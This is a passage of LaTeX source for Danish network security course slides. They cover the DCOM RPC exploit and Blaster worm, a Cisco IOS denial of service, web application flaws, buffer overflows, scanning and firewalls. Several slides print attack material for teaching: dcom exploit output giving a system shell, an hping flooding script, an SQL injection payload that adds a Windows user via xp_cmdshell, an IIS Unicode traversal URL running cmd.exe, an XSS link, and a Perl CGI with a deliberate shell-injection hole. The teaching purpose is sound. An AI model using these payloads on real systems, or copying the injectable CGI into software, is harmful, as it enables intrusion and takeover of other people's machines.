%\link{http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0352}\\
\link{http://www.securityfocus.com/news/6519}\\
\link{http://www.cert.org/advisories/CA-2003-16.html}\\
\link{http://lsd-pl.net/} -  detaljerede beskrivelser af exploits
\end{list1}


\slide{Start på demo}

\hlkimage{16cm}{images/server-client.pdf}

\begin{list2}
\item To almindelige computere - en switch erstatter Internet
\item Windows er installeret på et system og ikke opdateret
\item dcom.c exploit er hentet fra Internet og bruges næsten uændret
\end{list2}


\slide{Hvad sker der?}

\begin{alltt}
[hlk@fiona hlk]$ ./dcom 6 10.0.0.206
---------------------------------------------------------
- Remote DCOM RPC Buffer Overflow Exploit
- Original code by FlashSky and Benjurry
- Rewritten by HDM <hdm [at] metasploit.com>
- Using return address of 0x77e626ba
- Dropping to System Shell...

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

\verb+C:\WINDOWS\system32>exit+   {\bf - find selv på kommandoer, fri adgang!!}

 - Read failure
[hlk@fiona hlk]$ 
\end{alltt}

\slide{RPC sårbarheden udnyttes!}

\begin{quote}
*WINDOWS RPC FLAW EXPLOITED IN CAMPUS HACKER ATTACKS
California universities are among the first public victims of the Windows
Remote Procedure Call (RPC) protocol flaw, which allows an attacker to run
code of choice on a compromised system.

Cedric Bennett, director of information security at Stanford University,
says 2,400 of his school's computers were tainted with deeply imbedded
code. The unauthorized code, which Bennett declined to describe in detail,
will have to be manually removed, a process that could take several hours
for each compromised machine.
...
\end{quote}
Citat fra: SECURITY WIRE DIGEST, VOL. 5, NO. 60, AUGUST 11, 2003
Security Wire Digest is a newsletter published by Information Security,
the industry's leading source of security news and information.
\link{http://infosecuritymag.techtarget.com}

\slide{Windows RPC/dcom - Blaster orm}

\begin{list1}
\item Kilde: Symantec - 12/8 2003
  \begin{list2}
    
  \item THREAT:          W32.Blaster.Worm
  \item CATEGORY:  3
    W32.Blaster.Worm is a worm that will exploit the DCOM RPC
    vulnerability using TCP port 135. It will attempt to download and
    run a file, msblast.exe. 
  \item STEP 1: Read Critical Information  
  \item STEP 2: Update your Virus Definitions
    
  \end{list2}
  
\item Situationen er den sædvanlige - den almindelige livscyklus for
  en sårbarhed
  \begin{list2}
    \item[10] Der findes en sårbarhed - hackergruppe, leverandør eller
    sikkerhedskonsulent
\item Leverandøren kontaktes og på et tidspunkt offentliggøres
  informationen
\item Der kommer proof-of-concept kode (PoC), exploit program
\item Sårbarheden bliver populær
\item Der kommer en orm - og folk går i panik
%\item \emph{goto 10}
  \end{list2}

\end{list1}

\slide{Cisco Denial of service CVE-2003-0567} 

\begin{list1}
\item Cisco routere - ude af drift angreb - juli 2003
  \begin{list2}
    

\item Med en bestemt sekvens af pakker til routerens egen adresse på
  et interface kan den bringes i en tilstand hvor den ikke sender
  pakker videre - dødt interface
\item \emph{This issue affects all Cisco devices running Cisco IOS software
  and          configured to process Internet Protocol version 4
  (IPv4) packets. This includes          routers as well as switches
  and line cards which run Cisco IOS software. Cisco          devices
  which do not run Cisco IOS software are not affected.} 

\item kræver genstart

\item pakkerne kan sågar genereres med et shellscript (batch fil) og
  programmer som hping\\ 
  \end{list2}
\item Kilder:\\
\link{http://www.cisco.com/warp/public/707/cisco-sa-20030717-blocked.shtml}\\
\link{http://www.cert.org/advisories/CA-2003-15.html}\\
\link{http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0567}
\end{list1}

\slide{Cisco \emph{exploit} script}


\begin{alltt}    
\small
#!/bin/sh
# 2003-07-21 pdonahue
# cisco-44020.sh
# -- this shell script is just a wrapper for hping (http://www.hping.org)
#    with the parameters necessary to fill the input queue on
# exploitable IOS device
# -- refer to "Cisco Security Advisory: Cisco IOS Interface Blocked by
# IPv4 Packets" 
# (http://www.cisco.com/warp/public/707/cisco-sa-20030717-blocked.shtml)
#for more information 
...
for protocol in $PROT
    do
       $HPING $HOST --rawip $ADDR --ttl $TTL --ipproto $protocol \\
       --count $NUMB --interval u250 --data $SIZE --file /dev/urandom
    done

\end{alltt}


\slide{Sårbarheder - CVE og ICAT}

\begin{list1}
\item Common Vulnerabilities and Exposures (CVE) er:
  \begin{list2}
  \item klassifikation
  \item unik navngivning af sårbarheder. 
  \end{list2}
\item Sårbarheder tildeles
  \begin{list2}
  \item initielt oprettes med status CANDIDATE
  \end{list2}
\item CVE vedligeholdes af MITRE - som er en not-for-profit 
organisation skabt til forskning og udvikling i USA.
National Vulnerability Database er en af mulighederne for at søge i CVE. 
%\item CVE er et kvantespring indenfor sikkerhed - og en stor succes!
\item Kilde: \link{http://cve.mitre.org/} og \link{http://nvd.nist.gov}
\end{list1}

\slide{ICAT klassifikation af sårbarheder}

\begin{list1}
\item ICAT is a fine-grained searchable index of standardized
  vulnerabilities that links users into publicly available
  vulnerability and patch information 
\item ICAT klassificerer efter:
  \begin{list2}
  \item Input validation error, Boundary overflow og Buffer overflow
  \item Access validation error
  \item Exceptional condition handling error
  \item Environmental error
  \item Configuration error
  \item Race condition
  \item Design error
  \item Other
  \end{list2}
\item Kilde:
  \link{http://icat.nist.gov/icat.cfm}
\end{list1}

\slide{Sårbarheder - eksempler}

\begin{list1}
\item \small CVE-2000-0884\\
IIS 4.0 and 5.0 allows remote attackers to read documents outside of
the web root, and possibly execute arbitrary commands, via malformed
URLs that contain UNICODE encoded characters, aka the "Web Server
Folder Traversal" vulnerability.   

\item \small CVE-2002-1182\\ 
IIS 5.0 and 5.1 allows remote attackers to cause a denial of service
(crash) via malformed WebDAV requests that cause a large amount of
memory to be assigned.    

\item CVE Version: 20020625 Total Entries: 2223
opdateres ikke så ofte, ICAT opdateres løbende og er kompatibel med CVE

\item ICAT contains: 5356 vulnerabilities                 
Last updated: 01/07/03

\item Kilde:\\
\link{http://cve.mitre.org/ - CVE}\\
\link{http://icat.nist.gov/icat.cfm} - ICAT
\end{list1}


\slide{Altid aktuelt - DNS og web}

\begin{list1}
\item Navneservere er tit under angreb, hvorfor?!
  \begin{list2}
  \item Står på netværk med god forbindelse
  \item Har kendte adresser
  \item Kører oftest ISC BIND
  \item BIND har mange funktioner - mange fejl
  \item Den der kontrollerer navneservere kan omdirigere trafik
  \end{list2}
\item webservere er altid under angreb
  \begin{list2}
\item Webserveren er virksomhedens ansigt ud mod Internet eller måske
  selve indtjeningen - for e-handel
    \item Microsoft Internet Information Services - IIS - kendt og
    berygtet for at indeholder megen funktionalitet - farlig
    funktionalitet
\item Apache har haft nogle grimme oplevelser for nyligt, og PHP er en
  kilde til mange sikkerhedsproblemer - hvem sagde PHP Nuke?!
  \end{list2}
\end{list1}


\slide{Windows NT familien}

\begin{list1}
\item Windows NT, Windows 2000 - server og workstation versioner
\item Læg mærke til de applikationer i lægger ovenpå - åbner porte!
\begin{list2}
\item Internet Information Services IIS
\item databaser
\item diverse klienter - TSM klient!
\end{list2}
\item Opsætning af Microsoft Internet Information Services IIS\\
brug Microsoft's egne guider og andre checklister
\item Eksempelvis Gold Standard\\
{\small \emph{Windows 2000 Professional Gold Standard Security Benchmarks
are available for download at: 
Center for Internet Security \link{www.cisecurity.org} 
The National Security Agency \link{www.nsa.gov}}} 
\end{list1}


\slide{konfigurationsfejl - ofte overset}

\begin{list1}
\item Forkert brug af programmer er ofte overset
\begin{list2}
\item opfyldes forudsætningerne
\item er programmet egnet til dette miljø
\item er man udannet/erfaren i dette produkt
\end{list2}
\item Kunne I finde på at kopiere cmd.exe til
/scripts kataloget på en IIS?
\item Det har jeg engang været ude for at en kunde havde gjort!
\item hvis I under test af en server opdager at denne har
  /scripts/cmd1.exe eller "FTP-scripts" til at hente værktøjer ...
så er den pågældende server formentlig kompromitteret 
\end{list1}

\slide{Insecure programming}

\vskip 2 cm

\begin{list1}
\item Problem:\\
Ønsker et simpelt CGI program, en web udgave af finger
\item Formål:\\
Vise oplysningerne om brugere på systemet
\end{list1}

\slide{review af nogle muligheder}

\begin{list1}
\item ASP
\begin{list2}
\item server scripting, meget generelt - man kan alt
\end{list2}

\item SQL
\begin{list2}
\item databasesprog - meget kraftfuldt
\item mange databasesystemer giver mulighed for specifik tildeling af
  privilegier "grant" 
  \end{list2}
\item JAVA
\begin{list2}
\item generelt programmeringssprog
\item bytecode verifikation
\item indbygget sandbox funktionalitet 
\end{list2}
\item Perl og andre generelle programmeringssprog
\item Pas på shell escapes!!!
\end{list1}

\slide{Hello world of insecure web CGI}

\begin{list1}
\item Demo af et sårbart system - badfinger
\item Løsning:
\begin{list2}
\item Kalde finger kommandoen
\item et Perl script
\item afvikles som CGI 
\item standard Apache HTTPD 1.3 server
\end{list2}
\end{list1}

\slide{De vitale - og usikre dele}

{\small
\begin{verbatim}
print "Content-type: text/html\n\n<html>";
print "<body bgcolor=#666666 leftmargin=20 topmargin=20"; 
print "marginwidth=20 marginheight=20>";
print <<XX;
<h1>Bad finger command!</h1>
<HR COLOR=#000>
<form method="post" action="bad_finger.cgi">
Enter userid: <input type="text" size="40" name="command">
</form>
<HR COLOR=#000>
XX
if(&ReadForm(*input)){
    print "<pre>\n";
    print "will execute:\n/usr/bin/finger $input{'command'}\n";
    print "<HR COLOR=#000>\n";
    print `/usr/bin/finger $input{'command'}`;
    print "<pre>\n";
}
\end{verbatim}}

\slide{Almindelige problemer}

\begin{list1}
\item validering af forms
\item validering på klient er godt\\
- godt for brugervenligheden, hurtigt feedback
\item validering på clientside gør intet for sikkerheden
\item serverside validering er nødvendigt
\item generelt er input validering det største problem!
\end{list1}

Brug \emph{Open Web Application Security
Project} \link{http://www.owasp.org}

\slide{SQL injection}

\begin{list1}
\item SQL Injection FAQ 
\link{http://www.sqlsecurity.com}:
\begin{alltt}
\small  
Set myRecordset = myConnection.execute
("SELECT * FROM myTable
WHERE someText ='" & request.form("inputdata") & "'")  
med input: ' exec master..xp_cmdshell 'net user test testpass /ADD' --
modtager og udfører serveren:
SELECT * FROM myTable 
WHERE someText ='' exec master..xp_cmdshell
'net user test testpass /ADD'--' 
\end{alltt}
\item -- er kommentar i SQL
\end{list1}

\slide{Er SQL injection almindeligt?}


\begin{list1}
\item Ja, meget almindeligt!
\item Prøv at søge med google  
\end{list1}

\hlkimage{5cm}{images/database-hackers-handbook.jpg}
\begin{list1}
\item \emph{The Database Hacker's Handbook : Defending Database Servers
} David  Litchfield, Chris  Anley, John  Heasman, Bill  Grindlay,
Wiley 2005 ISBN: 0764578014
\end{list1}


\slide{Mere SQL injection / SQL server}

\begin{list1}
\item Threat Profiling Microsoft SQL Server\\
\link{http://www.nextgenss.com/papers/tp-SQL2000.pdf}
\begin{list2}
\item Hvordan sikrer man en SQL server?
\item mod fejl
\item mod netværksadgang
\item mod SQL injection
\end{list2}
\item NB: Hold øje med andre artikler fra samme sted\\
\link{http://www.nextgenss.com/research/papers.html}
\item Advanced SQL Injection In SQL Server Applications\\
\href{http://www.nextgenss.com/papers/advanced_sql_injection.pdf}
{http://www.nextgenss.com/papers/advanced\_sql\_injection.pdf}\\
(more) Advanced SQL Injection\\
\href{http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf}
{http://www.nextgenss.com/papers/more\_advanced\_sql\_injection.pdf}\\
begge af Chris Anley [chris@ngssoftware.com]
\end{list1}


\slide{Hvordan udnyttes forms nemmest?}

\begin{list1}
\item Download form:
\begin{alltt}
<FORM ACTION="opret.asp?mode=bruger?id=doopret"
METHOD="POST" NAME="opret"
ONSUBMIT="return validate(this)">
\end{alltt}
\item fjern kald til validering:
\begin{alltt}
<FORM ACTION="opret.asp?mode=bruger?id=doopret"
METHOD="POST" NAME="opret">
\end{alltt}
\item Tilføj 'BASE HREF' i header, findes med browser - højreklik
  properties i Internet Explorer

\end{list1}    


\slide{Hvordan udnyttes forms nemmest?}

\begin{list1}
\item Den form som man bruger er så - fra sin lokale harddisk:
\begin{alltt}
<HEAD>
<TITLE>Our Products</TITLE>
<BASE href="http://www.target.server/sti/til/form">
</HEAD>
...
<FORM ACTION="opret.asp?mode=bruger?id=doopret"
METHOD="POST" NAME="opret">
\end{alltt}
\item Kald form i en browser og indtast værdier
\end{list1}    

\slide{Cross-site scripting}

\begin{list1}
\item Hvis der inkluderes brugerinput I websider som vises, kan
der måske indføjes ekstra information/kode.
\item Hvis et CGI program, eksempelvis comment.cgi blot bruger værdien af "mycomment" vil 
følgende URL give anledning til cross-site scripting
\begin{alltt}
<A HREF="http://example.com/comment.cgi?
mycomment=<SCRIPT>malicious code</SCRIPT>
">Click here</A>  
\end{alltt}
\item Hvis der henvises til kode kan det endda give anledning til
afvikling i anden "security context"
\item Kilde/inspiration:
  \link{http://www.cert.org/advisories/CA-2000-02.html} 
\end{list1}

\slide{webroot - unicode dekodning}

\begin{list1}
\item webroot er det sted på harddisken, hvorfra data der vises af
  webserveren hentes. 

\item Unicode bug:\\
{\small
\verb-http://10.0.43.10/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:-
}
\item Kilde:\\
\link{http://www.cgisecurity.com/archive/misc/unicode.txt} - rain forest puppy\\
\link{http://online.securityfocus.com/bid/1806/info/} - securityfocus info
\end{list1}

\slide{Sårbare programmer}
\begin{list1}
\item Hvorfor er programmerne stadig sårbare?
\item RFP exploits - adgang til kommandolinien via database\\
\verb+?:\Program Files\Common Files\System\Msadc\msadcs.dll+ 
\item Unicode - fejl i håndtering af specialtilfælde
\item double decode - flere fejl i håndtering af nye specialtilfælde
\item Dark spyrit jill.c - Internet Printing Protocol IPP.
                Ny funktionalitet som implementeres med fejl  
\item {\bf Programmer idag er komplekse!}
\end{list1}

\slide{Historik indenfor websikkerhed}

\begin{list1}
\item IIS track record
\begin{list2}
\item meget funktionalitet
\item større risiko for fejl
\item alvorlige fejl - arbitrary code execution
\end{list2}
\item Apache track record
\begin{list2}
\item typisk mindre funktionalitet
\item typisk haft mindre alvorlige fejl
\end{list2}
\item PHP track record
Sammenligning IIS med Apache+PHP, idet en direkte sammenligning mellem
IIS og Apache vil være unfair 
\item {\bfseries Meget få har idag små websteder med statisk indhold}
\end{list1}


\slide{Opsummering websikkerhed}

\begin{list1}
\item Husk hidden fields er ikke mere skjulte end
"view source"-knappen i browseren
\item serverside validering er nødvendigt
\item SQL injection er nemt at udføre og almindeligt
\item Cross-site scripting kan have uanede muligheder
\item Brug listen fra \link{http://www.owasp.org}
\end{list1}

\slide{Privilegier least privilege}

\begin{list1}
\item Hvorfor afvikle applikationer med administrationsrettigheder -
  hvis der kun skal læses fra eksempelvis en database?
\item {\bfseries least privilege} 
betyder at man afvikler kode med det mest
restriktive sæt af privileger - kun lige nok til at
opgaven kan udføres
\item Dette praktiseres ikke i webløsninger i Danmark - eller meget få steder
\end{list1}

\slide{Privilegier privilege escalation}
\begin{list1}
\item {\bfseries privilege escalation} er når man på en eller anden vis
opnår højere privileger på et system, eksempelvis som
følge af fejl i programmer der afvikles med højere
privilegier. Derfor HTTPD servere på UNIX afvikles som
nobody - ingen specielle rettigheder.
\item En angriber der kan afvikle vilkårlige kommandoer kan ofte finde
  en sårbarhed som kan udnyttes lokalt - få rettigheder = lille skade
\end{list1}

%\slide{Client side hacking}

%browser sikkerhed

%Internet Explorer fejl kan udnyttes til at skaffe sig adgang til et
%firma

%Valve sagen




\slide{Hærdning af Microsoft IIS}

\begin{list1}
\item Internet Information Services kan hærdes ...
\item det kræver blot at man følger den guide som Microsoft har lavet
\item - og at man jævnligt følger med i opdateringer til denne guide
\item det anbefales at bruge de tilgængelige værktøjer som
  eksempelvis urlscan
\vskip 2 cm
\item IIS version 6 er mere sikker i default
  opsætningen - næsten alt er slået fra
\end{list1}



% session 3-1 

\slide{Internet er oprindeligt UNIX}
\begin{list1}
\item Unix - the ultra short, short intro
\item 1969 - Bell Laboratories PDP7
\item Unix er: en kerne og en bunke værktøjer :)
\begin{list2}
\item Libraries     - libc, system kald
\item Sockets       - local, INET
\item Protokols     - IP, ICMP, TCP, UDP, IPv6
\item Applications  - FTP, SMTP, HTTP, 
\item Daemons       - FTPD, Sendmail, BIND, NFSD, POP3, IMAPD
\end{list2}
\item Idag mange varianter:
*BSD, Linux, Solaris, AIX, HP-UX, Mac OS X, 
... er Windows UNIX?
\end{list1}


% UNIX services

% RPC scanning rpcinfo, portmapper

% NFS, rlogin, rsh, telnet osv.


\slide{Undgå standard indstillinger}

\begin{list1}
\item når vi scanner efter services går det nemt med at finde dem
\item Giv jer selv mere tid til at omkonfigurere og opdatere ved at undgå standardindstillinger
\item Tiden der går fra en sårbarhed annonceres på bugtraq til den
  bliver udnyttet er meget kort idag! 
\item Ved at undgå standard indstillinger kan der
  måske opnås en lidt længere frist - inden ormene kommer
\item NB: ingen garanti - og det hjælper sjældent mod en dedikeret angriber
\end{list1}

% opgaver session 3-1 
\slide{Opgave: BIND version}
\label{ex:bind-version}

{\bfseries Opgave:} \\
Find version på BIND software på UNIX serveren og skift den ud
- fælles opgave

{\bfseries Forslag til fremgangsmåde:}\\ 
Brug en af følgende kommandoer til at finde version på BIND på
navneserveren:\\ 

\verb+nslookup -q=txt -class=CHAOS version.bind. 0 server+

\verb+dig @server version.bind chaos txt+

Ret dernæst versionsinformationen i konfigurationen. Vi gør det sammen
på UNIX serveren.

{\bfseries Hjælp:} \\
Konfigurationsfilen hedder \verb+named.conf+ på BIND version 8 og BIND
version 9

Brug google - evt. med \emph{I feel lucky}

{\bfseries Diskussion:} \\
BIND softwaren er ofte udsat for angreb - som nævnt tidligere, det
skader ikke at skjule sin version - tværtimod


\slide{Opgave: RPC info}
\label{ex:unix-rpc}

{\bfseries Opgave:} \\
Find RPC services på UNIX

{\bfseries Forslag til fremgangsmåde:} \\
\verb+rpcinfo -p 10.0.43.11+

{\bfseries Hjælp:} \\
RPC info programmet kontakter portmapper programmet på den pågældende
server og får en liste over de tilgængelige services

{\bfseries Diskussion:}\\
Bør denne funktion være tilgængelig på produktionsudstyr?

Hvad er ulempen ved services der ikke ligger på faste porte?
(hint: tænk firewalls)



% session 3-2 Buffer overflows i detaljer

\slide{buffer overflows et C problem}

\begin{list1}
\item {\bfseries Et buffer overflow}
er det der sker når man skriver flere data end der er afsat plads til
i en buffer, et dataområde. Typisk vil programmet gå ned, men i visse
tilfælde kan en angriber overskrive returadresser for funktionskald og
overtage kontrollen. 
\item {\bfseries Stack protection} 
er et udtryk for de systemer der ved hjælp af operativsystemer,
programbiblioteker og lign. beskytter stakken med returadresser og
andre variable mod overskrivning gennem buffer overflows. StackGuard
og Propolice er nogle af de mest kendte.
\end{list1}

\slide{Exploits - udnyttelse af sårbarheder}

\begin{list1}
\item exploit/exploitprogram er
\begin{list2}
\item udnytter eller demonstrerer en sårbarhed
\item rettet mod et specifikt system.
\item kan være 5 linier eller flere sider
\item Meget ofte Perl eller et C program 
\end{list2}
\end{list1}

Eksempel:
\begin{verbatim}
 #! /usr/bin/perl
 # ./chars.pl | nc server 31337
 print "abcdefghijkl";
 print chr(237);
 print chr(13);
 print chr(220);
 print chr(186);
 print "\n";
\end{verbatim}

\slide{local vs. remote exploits}

\begin{list1} 
\item {\bfseries local vs. remote}
angiver om et exploit er rettet mod
en sårbarhed lokalt på maskinen, eksempelvis
opnå højere privilegier, eller beregnet
til at udnytter sårbarheder over netværk
\item {\bfseries remote root exploit} 
- den type man frygter mest, idet
det er et exploit program der når det afvikles giver
angriberen fuld kontrol, root user er administrator
på UNIX, over netværket. 
\item {\bfseries zero-day exploits} dem som ikke offentliggøres - dem
  som hackere holder for sig selv. Dag 0 henviser til at ingen kender
  til dem før de offentliggøres og ofte er der umiddelbart ingen
  rettelser til de sårbarheder
\end{list1}

\slide{Hvordan laves et buffer overflow?}

\begin{list1}
\item Findes ved at prøve sig frem
\begin{list2}
\item black box testing
\item closed source
\item reverse engineering
\end{list2}
\item Ved Open source Findes de typisk ved at læse/analysere koden 
\begin{list2}
\item RATS
\item flere andre 
\end{list2}
\item Virker typisk mod specifikke versioner
\begin{list2}
\item Windows IIS 4.0 med service pack XX
\item Red Hat Linux 7.3 default
\end{list2}
\end{list1}

\slide{Buffer overflows}

\hlkimage{3cm}{images/shellcoders-handbook.jpg}

\begin{list1}
\item Hvis man vil lære at lave buffer overflows og exploit programmer
  er følgende dokumenter et godt sted at starte
\item \emph{Smashing The Stack For Fun And Profit} Aleph One
\item \emph{Writing Buffer Overflow Exploits with Perl - anno 2000}
\item Dernæst kan man bevæge sig mod Windows epxloits, integer
  overflows m.fl.
\item Følgende bog kan ligeledes anbefales:
\emph{The Shellcoder's Handbook : Discovering and Exploiting Security Holes} 
af Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, Sinan
"noir" Eren, Neel Mehta, Riley Hassell, John Wiley \& Sons, 2004 
\item NB: bogen er avanceret og således IKKE for begyndere! 
\end{list1}



\slide{Stack protection}

\begin{list1}
\item Stack protection er mere almindeligt\\
- med i OpenBSD current fra 2. dec 2002

\item Buffer overflows er almindeligt kendte
\begin{list2}    
\item Selv OpenSSH har haft buffer overflows
\item Stack protection prøver at modvirke/fjerne
  muligheden for buffer overflows. arbitrary code execution
  bliver til ude af drift for berørte services
\end{list2}

\item Propolice\\
\link{http://www.openbsd.org}\\
\link{http://www.trl.ibm.com/projects/security/ssp/}

\item StackGuard\\
\link{http://www.immunix.org/stackguard.html}
\end{list1}


\slide{JAVA programmering}

\begin{list1}
\item Hvorfor ikke bare bruge JAVA?
\item JAVA karakteristik
\begin{list2}
\item automatisk garbage collection
\item bytecode verifikation på
\item mulighed for signeret kode
\item beskyldes for at være langsomt
\item platformsuafhængigt
\end{list2}
\item JAVA just in Time (JIT) er sammenligneligt med kompileret C
\item god sikkerhedsmodel - men problemer i implementationerne
\item JVM - den virtuelle maskine er udsat for hacking
\end{list1}

% session 3-3 scripting af angreb

\slide{Opgave: netcat til scripting}
\label{ex:netcat-1}

{\bfseries Opgave:} \\
Lær at bruge netcat til scripting: \verb+./head.sh www.pentest.dk 80+

{\bfseries Forslag til fremgangsmåde:} \\
Login på UNIX server - læs manualen til nc programmet. Lav dernæst et program head.sh:
\begin{alltt}
\input{scripts/head.sh}
\end{alltt}

{\bfseries Hjælp:}\\
Netcat programmet sender vilkårlige data videre ud på nettet.

\slide{ASCII baserede protokoller}

{\bfseries Diskussion:}\\
I skal se/lære at mange protokoller i dag er \emph{ASCII baserede} -
dvs benytter kommandoer i klar tekst, GET, HEAD, QUIT osv. som gør det
nemt at debugge.


\begin{list1}
\item Det gælder eksempelvis for:
\begin{list2}
\item SMTP
\item POP3
\item FTP
\item HTTP    
\end{list2}
\item man kan altså forbinde til den pågældende service og interagere
\end{list1}

\slide{Opgave: OpenSSL forbindelser}
\label{ex:openssl}

{\bfseries Opgave:}
Lær at bruge openssl til scripting af forbindelser til SSL/TLS

{\bfseries Forslag til fremgangsmåde:} \\
Login på UNIX server - læs manualen til openssl programmet - se især på
\verb+s_client+ delen. Lav dernæst et program headssl.sh med følgende
indhold: 
\begin{alltt}
\input{scripts/headssl.sh}
\end{alltt}

Udfør programmet med: \verb+./headssl.sh server 443+

{\bfseries Hjælp:} 
Openssl programmet kan fungere som en wrapper til forbindelser til
webservere og andre protokoller som benytter SSL/TLS


\slide{SSL og TLS}

{\bfseries Diskussion:} \\
Secure Sockets Layer SSL er idag blevet adopteret af IETF og kaldes
derfor også for Transport Layer Security TLS - se RFC-2246.
TLS er baseret på SSL Version 3.0



% session 3-4 automatiseret sårbarhedsscanning

\slide{Hackerværktøjer}

\begin{list1}
\item Dan Farmer og Wietse Venema skrev i 1993 artiklen\\
\emph{Improving the Security of Your Site by Breaking Into it}
\item Senere i 1995 udgav de så en softwarepakke med navnet SATAN
\emph{Security Administrator Tool for Analyzing Networks}
 Pakken vagte
 en del furore, idet man jo gav alle på internet mulighed for at hacke
\begin{quote}
We realize that SATAN is a two-edged sword - like
many tools, it can be used for good and for evil
purposes. We also realize that intruders (including
wannabees) have much more capable (read intrusive)
tools than offered with SATAN. 
\end{quote}
\item SATAN og ideerne med automatiseret scanning efter sårbarheder
  blev siden ført videre i programmer som Saint, SARA og idag findes
  mange hackerværktøjer og automatiserede scannere: 
\begin{list2}
\item Nessus, ISS scanner, Fyodor Nmap, Typhoon, ORAscan
\end{list2}
\end{list1}
Kilde:
\link{http://www.fish.com/security/admin-guide-to-cracking.html}



\slide{Brug hackerværktøjer!}

\begin{list1}
\item Hackerværktøjer - bruger I dem? - efter dette kursus gør I 
\item portscannere kan afsløre huller i forsvaret
\item webtestværktøjer som crawler igennem et website og finder alle
  forms kan hjælpe
\item I vil kunne finde mange potentielle problemer proaktivt ved
  regelmæssig brug af disse værktøjer - også potentielle driftsproblemer
\item husk dog penetrationstest er ikke en sølvkugle
\item honeypots kan måske være med til at afsløre angreb og
  kompromitterede systemer hurtigere
\end{list1}


\slide{"I only replaced index.html"}

\begin{list1}
\item Hvad skal man gøre når man bliver hacket ?
\item Hvad koster et indbrud?
\begin{list2}
\item Tid - antal personer der ikke kan arbejde
\item Penge - oprydning, eksterne konsulenter
\item Bøvl - sker altid på det værst mulige tidspunkt
\item Besvær - ALT skal gennemrodes
\item Tab af image/goodwill
\end{list2}
\item Forensic challenge:
I gennemsnit brugte deltagerne 34 timer pr person på
at efterforske i rigtige data fra et indbrud!
angriberen brugte ca. 30 min
\item Kilder:
\link{http://project.honeynet.org/challenge/results/}\\
\link{http://packetstorm.securify.com/docs/hack/i.only.replaced.index.html.txt}
\end{list1}

\slide{Recovering from break-ins}

\begin{list1}
\item {\color{red}\bfseries DU KAN IKKE HAVE TILLID TIL NOGET}
\item På CERT website kan man finde mange gode ressourcer omkring
  sikkerhed og hvad man skal gøre med kompromiterede servere
\item Eksempelvis listen over dokumenter fra adressen:\\
  \link{http://www.cert.org/nav/recovering.html} 
  \begin{list2}
  \item The Intruder Detection Checklist
  \item Windows NT Intruder Detection Checklist 
  \item The UNIX Configuration Guidelines
  \item Windows NT Configuration Guidelines 
  \item The List of Security Tools
  \item Windows NT Security and Configuration Resources 
  \end{list2}
%\item Hvis man mener man står med en kompromitteret server kan
%  følgende være nødvendigt
%  \href{http://www.cert.org/tech_tips/root_compromise.html} 
%{http://www.cert.org/tech\_tips/root\_compromise.html}
\end{list1}


% opgaver session 3-4

\slide{Opgave: Nessus scanning}
\label{ex:nessus}

{\bfseries Opgave:}\\ 
Brug Nessus til at lave en test af lokalnettet

{\bfseries Forslag til fremgangsmåde:} \\
Start en Nessus klient og start en scanning ved brug af UNIX serveren
- som har en Nessus server installeret

{\bfseries Hjælp:}\\ 
Der findes en Windows klient til Nessus - men serveren afvikles altid
på UNIX

{\bfseries Diskussion:} \\
Nessus servere kan installeres bredt i et større netværk og kan derved
understøtte distribueret scanning.


% session 3-5

% \slide{Overblik}

% begynde at samle alle trådene til et overblik

\slide{firewalls}

\begin{itemize}
\item Basalt set et netværksfilter - det yderste fæstningsværk
\item Indeholder typisk:
  \begin{list2}
   \item Grafisk brugergrænseflade til konfiguration - er det en
   fordel?
\item TCP/IP filtermuligheder - pakkernes afsender, modtager, retning
  ind/ud, porte, protokol, ...
\item kun IPv4 for de kommercielle firewalls
\item både IPv4 og IPv6 for Open Source firewalls: IPF, OpenBSD PF,
  Linux firewalls, ...
\item foruddefinerede regler/eksempler - er det godt hvis det er nemt
  at tilføje/åbne en usikker protokol?
\item typisk NAT funktionalitet indbygget
\item typisk mulighed for nogle serverfunktioner: kan agere
  DHCP-server, DNS caching server og lignende
  \end{list2}
\item En router med Access Control Lists - ACL kaldes ofte
  netværksfilter, mens en dedikeret maskine kaldes firewall -
  funktionen er reelt den samme - der filtreres trafik
\end{itemize}

\slide{firewall regelsæt eksempel}

\begin{alltt}
\tiny 
# hosts
router="217.157.20.129"
webserver="217.157.20.131"
# Networks
homenet="{ 192.168.1.0/24, 1.2.3.4/24 }"
wlan="10.0.42.0/24"
wireless=wi0

# things not used
spoofed="{ 127.0.0.0/8, 172.16.0.0/12, 10.0.0.0/16, 255.255.255.255/32 }"

block in all # default block anything
# loopback and other interface rules
pass out quick on lo0 all
pass in quick on lo0 all

# egress and ingress filtering - disallow spoofing, and drop spoofed
block in quick from $spoofed to any
block out quick from any to $spoofed

pass in on $wireless proto tcp from $wlan to any port = 22
pass in on $wireless proto tcp from $homenet to any port = 22
pass in on $wireless proto tcp from any to $webserver port = 80

pass out quick proto tcp  from $homenet to any flags S/S keep state
pass out quick proto udp  from $homenet to any         keep state
pass out quick proto icmp from $homenet to any         keep state
\end{alltt}
%$


\slide{netdesign - med firewalls - 100\% sikkerhed?}

\begin{center}
\colorbox{white}{\includegraphics[width=12cm]{images/kut.jpg}}  
\end{center}

\begin{list1}
\item Hvor skal en firewall placeres for at gøre størst nytte?
\item Hvad er forudsætningen for at en firewall virker?\\
At der er konfigureret et sæt fornuftige regler!
\item Hvor kommer reglerne fra? Sikkerhedspolitikken!
%\item Kan man lave en 100\% sikker firewall? Ja selvfølgelig, se!
\end{list1}


\centerline{\small Kilde: Billedet er fra Marcus Ranum The ULTIMATELY
  Secure Firewall} 


\slide{IPsec}

\begin{itemize}
\item Sikkerhed i netværket
\item RFC-2401 Security Architecture for the Internet Protocol
\item RFC-2402 IP Authentication Header (AH)
\item RFC-2406 IP Encapsulating Security Payload (ESP)
\item RFC-2409 The Internet Key Exchange (IKE) - dynamisk keying
\item Både til IPv4 og IPv6
\item {\bfseries MANDATORY} i IPv6! - et krav hvis man implementerer
  fuld IPv6 support
\item god præsentation på \link{http://www.hsc.fr/presentations/ike/}
\item Der findes IKEscan til at scanne efter IKE
  porte/implementationer\\
\link{http://www.nta-monitor.com/ike-scan/index.htm}
\end{itemize}

\slide{IPsec er ikke simpelt!}


\hlkimage{16cm}{images/ipsec-hsc.png}}  

\centerline{Kilde: \link{http://www.hsc.fr/presentations/ike/}}



\slide{Confidentiality Integrity Availability}

\vskip 1 cm

